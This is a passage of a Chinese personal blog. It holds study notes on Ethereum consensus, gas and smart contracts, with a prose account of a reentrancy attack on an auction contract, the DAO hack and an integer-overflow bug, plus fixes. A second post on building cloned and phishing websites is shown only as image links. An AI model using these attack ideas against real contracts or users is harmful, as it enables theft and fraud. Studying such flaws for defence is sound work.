<p><strong>奖励机制证明方式：</strong>目前正有工作量证明（POW）向权益证明(POS: Proof of State)转型，但是目前还是pow；但是由于POS还不完善，无法直接投入使用；而挖矿难度呈指数增加，所以在2017年-2018年之间进行了难度下调。（（奖励）铸币数也由5个降低为3个）</p>
<p>​    问：为什么不直接就推行pos？而且要由pow过渡？</p>
<p>​    答：由于矿工投入了大量资金打造挖矿设备，若马上采取pos，那么挖矿设备就没用了，用于引起暴动，也容易产生以太坊分支，不利于发展。</p>
<p><strong>权益证明主流思想：</strong></p>
<p>​    以太坊中，准备采用的权益证明协议为Casper the Friendly Finality Gadget(FFG)，该协议在过渡阶段是要和POW结合使用的。FFG协议引入一个概念：Validator(验证者)，一个用户想要成为Validator，需要上交一笔“保证金”，这笔保证金会被系统锁定。Validator的职责是推动系统达成共识，投票决定哪一条链成为最长合法链，投票权重取决于保证金数目。它采用两次投票的方式：prepare投票和Commit 投票，规定每次投票结果都要获得2/3以上的验证者同意；把100个区块等分为2部分；前50个采用commit投票，后50个采用prepare投票（相对的），当2个部分都通过了，这100个区块才算通过。如图</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906201626270.png" alt="image-20210906201626270"></p>
<p><strong>权益证明的奖罚机制：</strong>为了鼓励大家参与验证epoch，每次完成验证，都会得到相应的验证奖励；为了防止攻击/捣乱，如果有权益者不参与投票，那么他会扣罚一部分保证金；而对于同时2边都投的权益者，则没收其全部保证金；通过惩罚积出的以太币会被销毁。</p>
<p><strong>奖励机制之预挖矿：</strong>这里“预挖矿”并不挖矿，而是在开发以太坊时，给开发者预留了一部分货币（其份额占目前已有币的大半部分）。</p>
<p><strong>以太坊难度调整：</strong>区块编号减去了三百万</p>
<p>算法如图</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906164806092.png" alt="image-20210906164806092"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906164853479.png" alt="image-20210906164853479"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906165209214.png" alt="image-20210906165209214"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906164952603.png" alt="image-20210906164952603"></p>
<p>补充：以前是没有H’的，是难度回调时才添加的（在什么不直接采用POS的背景下）</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906165653320.png" alt="image-20210906165653320"></p>
<p><strong>以太坊发展</strong></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210906170115398.png" alt="image-20210906170115398"></p>
<p><strong>智能合约</strong></p>
<p>说明：智能合约并不智能，只是一个由代码执行的合约规定；合约是根据需求用代码来表示的；因此，一般情况下，合约上链了，执行的结果也确定了，即使代码有漏洞/被利用/受到攻击等，都无法改变；这是由区块链的不可篡改性决定的。（当然，这不是绝对不可篡改，利用区块链回滚可以撤销操作，但是其会产生巨大的影响）</p>
<p>​    以公开拍卖智能合约为例</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907191401485.png" alt="image-20210907191401485"></p>
<p>​    <strong>合约调用：</strong></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907192116543.png" alt="image-20210907192116543"></p>
<p>补充：以太网规定，内部账号不能调用合约，只有外部账号才可以调用合约（这句话需要自行理解），这种调用如果出错，整个合约会一起回滚，不会往下执行。</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907192515304.png" alt="image-20210907192515304"></p>
<p>补充：这种调用，当函数调用出错时，call（）函数会返回false，表明调用失败；但是合约会继续往下执行。</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907192906267.png" alt="image-20210907192906267"></p>
<p>补充：这种调用与上面call（）调用类似，不同之处是调用时不用跳到另外合约环境中进行（当合约调用合约时），在本身合约执行即可。</p>
<p>（特别）匿名函数</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907193208569.png" alt="image-20210907193208569"></p>
<p>补充：当函数缺省/合约没有执行任何函数/调用函数不存在时，系统会调用该函数。</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907203719865.png" alt="image-20210907203719865"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907193527302.png" alt="image-20210907193527302"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907194720634.png" alt="image-20210907194720634"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907195902583.png" alt="image-20210907195902583"></p>
<p><strong>回答死循环问题：</strong>为了应对有的人恶意消耗资源（如：制造死循环），引入了汽油费的机制；（合约发起人）交易需要支付汽油费（执行不同语句消耗的汽油量不同）。由于无法确定合约执行汽油费的总额，每个合约还需要确定一个最大汽油费数值（表示愿意承受的费用）；而且每个区块也有一个汽油费上限；当消耗的汽油费超过区块最大汽油费，合约就会结束运行（即使交易没完成），注意回滚汽油费是不会退的。</p>
<p><strong>问：</strong>是先挖矿再执行合约？还是先执行合约再挖矿？</p>
<p><strong>答：</strong>先执行合约再挖矿。因为要想挖矿就必须获得完整的block header；其中状态树、交易树、收益树三颗树是存储在区块链的全结点上的；执行合约/验证交易时，用户的余额会发生变化，所以执行合约并验证结束后，三个树才能确定，三颗树确定后，block header才能确定，所以必须先执行合约再挖矿。<strong>注意</strong>：矿工在验证交易时是在本地验证的，那时候消耗的汽油量和余额变化是写在本地，只有挖到矿并成功写到区块链上才会生效；所以不存在如果挖不到矿，别人的汽油费白花的情况；也不存在多个矿工验证合约重复消耗合约的情况。</p>
<p><strong>问：</strong>既然是先验证/执行合约，再挖矿；那如果挖不到矿，岂不是白干活了？那可不可以直接不验证，用别人的结果，继续挖下一个区块？</p>
<p><strong>答：</strong>每个矿工都必须验证每一个交易/合约，即使挖不到而白干活；因为你不验证，你就得不到下一个区块的用户状态；必须验证后才可以获得当前完备且正确的状态。别人的验证结果是不可以套用的，因为验证/挖矿过程用的是自己的地址/hash值，别人验证用的是别人的地址/hash值（如果用，收款人就是对方，自己永远得不到奖励）；所以要想继续挖矿，就必须自己验证。</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907195059308.png" alt="image-20210907195059308"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907195225290.png" alt="image-20210907195225290"></p>
<p><strong>问：</strong>执行发送错误的交易需要发布到区块链上么？（注意是交易有错）</p>
<p><strong>答：</strong>需要；（1）如果不发布到区块链上就无法扣取汽油费；（2）交易是否出错，需要经过全部人验算才行</p>
<p>问：智能合约支持多线程么？</p>
<p>答：不支持，因为区块链要保证状态一致性；多线程容易产生多过结果，（多线程）多个核访问进程的顺序不同容易出现多个状态。但是区块链是分布式的。（所有会导致产生不确定状态的技术都不可以，例如真.随机数（伪随机数可以）</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907203754437.png" alt="image-20210907203754437"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907203812364.png" alt="image-20210907203812364"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907203952514.png" alt="image-20210907203952514"></p>
<p>说明：transfer（）转账过程出现错误会回滚；而send（）转账过程会抛出错误，但不会回滚。上面两个是专门用于转账的，但call（）也可以用于转账，call（）主要用于函数调用。</p>
<p><strong>拍卖例子：</strong>出价可以多次出（拍卖出价是发布合约交易的形式），所有拍卖货币要先锁在区块链上；拍卖结束时，未拍卖成功的人的币会返款，拍卖成功的人的币会转给拍卖货物的人。</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907205250354.png" alt="image-20210907205250354"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907205116102.png" alt="image-20210907205116102"></p>
<p>补充：拍卖结束时用一个for（）退款给拍卖的人。</p>
<p><strong>当出现多重合约调用情况</strong>：一个黑客写了一个合约hackV1（）合约，hackV1合约会；由于合约账户不用调用自身合约；所以黑客调用外部账户（另外一个账号）调用hackV1合约，再用转入hackV1合约的钱转到行拍卖合约进行拍卖（即hackV1合约通过调用拍卖合约，把转入把hackV1的再转到的拍卖合约）</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907211716347.png" alt="image-20210907211716347"></p>
<p>可能出现的问题：（hackV1合约只有一个函数，没有fallback（）函数）hackV1合约参与拍卖没问题，退款时会出现问题。执行退款for循环里transfer（）函数转账时，没有调用任何函数；当一个合约账户（这里是hackV1的账户）转账时（这里是收到转账）时没有调用任何函数，合约会自动调用fallback函数，而这个hackV1合约没有fallback函数；所以会抛出异常；又由于这里采用的是transfer（）函数进行交易，所以拍卖失败（出现异常）会发生回滚。回滚到交易前的状态，所以全部人都收不到退款。（注意：在拍卖混滚前，所有参与拍卖的货币，都是已经锁到了区块链上了；回滚只是回到了交易前的状态（程序认为是交易前状态，也就没有发生交易，就不会执行退款操作），但是实际上币已经支付出去了。）</p>
<p>引出：一旦合约代码出现漏洞/错误，放到了区块链上就无法修改，结果也不可改变。这是由于区块链不可篡改性导致的。</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907215416196.png" alt="image-20210907215416196"></p>
<p>补充：画红框的if语句的条件，只有在交易拍卖结束的时候才会为true</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907220032926.png" alt="image-20210907220032926"></p>
<p>补充：HackV2的fallback函数的if语句：当拍卖的返款的余额大于当初投入的钱（拍卖的余额足以支付报价）并且汽油量大于6000，状态深度小于500时；条件为真。</p>
<p><strong>出现的问题：</strong>当执行fallback函数时（就是function（）public payload{…}），调用了withdraw（）函数，当withdraw函数执行到上述红框语句（if的条件）时，又会触发HackV2的fallback函数，一直陷入死循环，直到拍卖里的币腿光；第一次调用是退回Hackv2用户自己的前，后面就是退别人的钱了。</p>
<p><strong>解决方法：</strong>（1）先将用户余额清零，再转账，转账失败再恢复余额；（2）call函数给为send函数/transfer（）因其汽油量问题。</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907221512457.png" alt="image-20210907221512457"></p>
<p><strong>DAO（Decentralized Autonomous Orgarization）</strong></p>
<p>​    DAO去中心化的自治织，这是一个泛称。大概理念是：大家把对自己有兴趣的基金进行投币，最后由投票权重觉得用这些币去赞助那个基金。</p>
<p>​    <strong>The DAO组织被盗币事件</strong></p>
<p>​    The DAO组织是一个典型的DAO，它会用以太币转化成代币进行交易，而且退款机制是采用了拆分技术，拆分后会有28天的审议期，由所有矿工评价拆分的好坏/是否要这样拆分。</p>
<p>The DAO合约的代码（一个函数）</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210908091951239.png" alt="image-20210908091951239"></p>
<p><strong>问题/漏洞：</strong>先转账，再清零；其漏洞与上面拍卖例子的最后一个问题一样；可能会产生重入攻击。</p>
<p><strong>影响</strong>：The DAO组织的合约当时集资了大概1.5亿美元，对应合约的以太币大概全部以太币的10%+（一个合约的资金就占整个市场的10%+，是非常恐怖的）；黑客利用该漏洞盗取了5000万+美元，大概1/3的以太币；给社会带来的巨大的恐慌，严重危害了以太币的发展。</p>
<p><strong>解决方法</strong>（软分叉、硬分叉、采用黑客相同的手段转走剩下的钱</p>
<p>​    由于Tho DAO有28天的拆分期（即交易货币会被锁定28天），所以给以太坊留了一定的时间做对策。以太坊大部分人同意采用回滚，把货币全部回滚；剩下的少部分人认为以太坊干预并强制回滚背离了去中心化理念，他们部分人认为黑客只是利用了合约（就像利用法律/合同漏洞）并没有犯法。结果最后以太坊采用了回滚（采用了美国历史上Too big to fail的金融危机处理理念：这件事的影响太大了，破坏了生态健康发展，所以国家/组织应该出面帮忙解决）</p>
<p><strong>问：</strong>回滚这操作真的完全是背离了去中心化的理念么？</p>
<p><strong>主观认为：</strong>大部分人赞同，也代表了民主的少数服从多数，也不算是决定的中心化决定（思考：但多数人认为的就一定是正确的么？）</p>
<p><strong>具体补救方法：</strong></p>
<p>（1）软分叉：以太坊更新了软件，让The Dao 的账号无法交易，其他交易正常进行。（结果：由于大部分人认为官方强制执行回滚，所以交易的汽油费不应该由交易账号出，所以交易没有收取汽油费；从而引起了大量的非法型交易攻击，给矿工们造成了巨大的打击（白干活），进而失败了。）</p>
<p>（2）硬分叉：软分叉失败后（28天的审议期只剩下几天），以太坊通过软件升级的方法把The DAO上的资金转到新的合约上（这个合约只是用来退币）；把代币退转回以太币；决定在第129万个区块上执行。说明：由于是以太坊强制执行的，不管同意不同意都强行把资金转到新的合约上（正常交易是要用到签名的），不用签名；所以旧矿工会认为这是非法交易，不认同该区块，于是会产生分叉，新矿工认同旧矿工的区块，但旧矿工永远不会认同新矿工的区块，因此分叉会永远存在，所以是硬分叉。 </p>
<p><strong>问：</strong>存在分叉就可能受到双花攻击，那该怎么做？</p>
<p><strong>答：</strong>给两条链设置ID。</p>
<p><strong>问：</strong>The DAO 事件中，以太坊是把所有The DAO的账户锁定；为什么不只锁定黑客的账户？</p>
<p>答：由于合约是定死了（区块链不可篡改性），如果只锁定黑客的账户，那么其他的交易账户也可以利用该漏洞成为下一个黑客。（注意：回滚是退回到某个区块，产生一个新的分叉，在新的分叉开挖；由于在当前区块后成功产生6个区块后，当前区块的交易才会被完全确认，所以回滚的结点常常要考虑回退的交易最少/造成的影响最小；如果直接回退到出错结点，往往会引起较大的影响）</p>
<p><strong>问：</strong>什么时候需要智能合约？</p>
<p><strong>答：</strong>当需要一个共识的控制逻辑下，在那些互不认识的情况下建立共识机制的条件下。</p>
<p>以太坊事件：美链</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210908104505017.png" alt="image-20210908104505017"></p>
<p>美链的一个函数</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210908104607563.png" alt="image-20210908104607563"></p>
<p>存在问题：数据溢出</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210908104646321.png" alt="image-20210908104646321"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210908104755939.png" alt="image-20210908104755939"></p>
<p><strong>数据溢出解决方法：</strong>c=a*b;if b=c/a,ture</p>
<p>注意：即使数据没溢出，但是如果操作数之间的精度不够，可能会出现精度丢失，造成的结果也不对。但是如果都整数类型，且是先进行乘法后用除法验证，就可以准确判断溢出问题。</p>
<p><strong>加密货币的应用场景：</strong>已有的支付方式没有较好解决的领域</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/" class="post-title-link" itemprop="url">揭秘克隆website和钓鱼website背后的技术</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-22 09:08:07" itemprop="dateCreated datePublished" datetime="2021-08-22T09:08:07+08:00">2021-08-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-10-08 11:09:47" itemprop="dateModified" datetime="2021-10-08T11:09:47+08:00">2021-10-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id><a href="#" class="headerlink" title></a><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908110616364.png" alt="image-20210908110616364"></h1><p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908110130833.png" alt="image-20210908110130833"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820094901355.png" alt="image-20210820094901355"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908110635582.png" alt="image-20210908110635582"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820095053082.png" alt="image-20210820095053082"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908105753727.png" alt="image-20210908105753727"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820095312794.png" alt="image-20210820095312794"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820095343365.png" alt="image-20210820095343365"></p>
<p>重启网络服务</p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820095428655.png" alt="image-20210820095428655"></p>
<h2 id="-1"><a href="#-1" class="headerlink" title></a><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908110111993.png" alt="image-20210908110111993"></h2><p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820100801661.png" alt="image-20210820100801661"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820101034588.png" alt="image-20210820101034588"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820100934417.png" alt="image-20210820100934417"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820100948433.png" alt="image-20210820100948433"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820101128896.png" alt="image-20210820101128896"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820101201274.png" alt="image-20210820101201274"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820101328065.png" alt="image-20210820101328065"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908105847666.png" alt="image-20210908105847666"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820150803600.png" alt="image-20210820150803600"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820101948469.png" alt="image-20210820101948469"></p>
<p>效果展示</p>
<p>控制台查看</p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820102127052.png" alt="image-20210820102127052"></p>
<p>图形界面查看</p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820102200407.png" alt="image-20210820102200407"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820102218425.png" alt="image-20210820102218425"></p>
<p>查看/修改website代码</p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820102327601.png" alt="image-20210820102327601"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820102347095.png" alt="image-20210820102347095"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908110703785.png" alt="image-20210908110703785"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908110052540.png" alt="image-20210908110052540"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104349468.png" alt="image-20210820104349468"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104408849.png" alt="image-20210820104408849"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104603190.png" alt="image-20210820104603190"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104459523.png" alt="image-20210820104459523"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104645872.png" alt="image-20210820104645872"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104659293.png" alt="image-20210820104659293"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104745057.png" alt="image-20210820104745057"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104827922.png" alt="image-20210820104827922"></p>
